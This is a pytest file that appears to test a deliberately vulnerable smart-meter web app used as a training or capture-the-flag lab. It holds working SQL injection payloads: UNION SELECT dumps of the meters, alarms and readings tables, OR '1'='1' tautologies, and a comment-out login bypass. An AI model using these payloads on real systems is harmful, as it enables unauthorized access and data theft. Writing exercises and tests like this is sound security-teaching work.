

def test_sqli_teach_admin_meters(ops1_admin, base_url, extract_flag_fn, redeem_flag_fn):
    payload = "zzz' UNION SELECT id,meter_code,user_id,nickname,status,balance,created_at,0,0,0 FROM meters--"
    resp = ops1_admin.get(f"{base_url}/admin/meters", params={"q": payload}, timeout=10)
    assert resp.status_code == 200
    flag = extract_flag_fn(resp.text)
    assert redeem_flag_fn(ops1_admin, base_url, flag)


def test_sqli_exercise_admin_alarms(ops1_admin, base_url, extract_flag_fn, redeem_flag_fn):
    payload = "zzz' UNION SELECT id,meter_id,type,message,created_at,0 FROM alarms--"
    resp = ops1_admin.get(f"{base_url}/admin/alarms", params={"q": payload}, timeout=10)
    assert resp.status_code == 200
    flag = extract_flag_fn(resp.text)
    assert redeem_flag_fn(ops1_admin, base_url, flag)


def test_sqli_bonus_usage(alice, base_url, extract_flag_fn, redeem_flag_fn):
    payload = "zzz' UNION SELECT reading_kwh, source, recorded_at FROM readings--"
    resp = alice.get(f"{base_url}/usage", params={"q": payload}, timeout=10)
    assert resp.status_code == 200
    flag = extract_flag_fn(resp.text)
    assert redeem_flag_fn(alice, base_url, flag)


def test_sqli_boolean_bonus_usage(alice, base_url, extract_flag_fn, redeem_flag_fn):
    payload = "' OR '1'='1' -- "
    resp = alice.get(f"{base_url}/usage", params={"q": payload}, timeout=10)
    assert resp.status_code == 200
    flag = extract_flag_fn(resp.text)
    assert redeem_flag_fn(alice, base_url, flag)


def test_sqli_auth_bypass_login(anon_session, base_url, extract_flag_fn, redeem_flag_fn):
    resp = anon_session.post(
        f"{base_url}/login",
        data={"email": "ops1@example.com'--", "password": "not-the-password"},
        timeout=10,
    )
    assert resp.status_code == 200
    assert resp.url.endswith("/admin/")
    flag = extract_flag_fn(resp.text)
    assert redeem_flag_fn(anon_session, base_url, flag)
    assert flag not in anon_session.get(f"{base_url}/admin/", timeout=10).text   # shown once


def test_sqli_auth_bypass_tautology(anon_session, base_url, extract_flag_fn):
    resp = anon_session.post(
        f"{base_url}/login", data={"email": "' OR '1'='1' --", "password": "x"}, timeout=10
    )
    assert resp.status_code == 200
    extract_flag_fn(resp.text)


def test_login_without_injection_shows_no_bypass_flag(anon_session, base_url):
    resp = anon_session.post(
        f"{base_url}/login",
        data={"email": "alice.smith@example.com", "password": "alice123"},
        timeout=10,
    )
    assert resp.status_code == 200
    assert "FLAG{" not in resp.text
    wrong = anon_session.post(
        f"{base_url}/login",
        data={"email": "alice.smith@example.com'", "password": "alice123"},
        timeout=10,
    )
    assert wrong.status_code == 401
    assert "Invalid username" in wrong.text
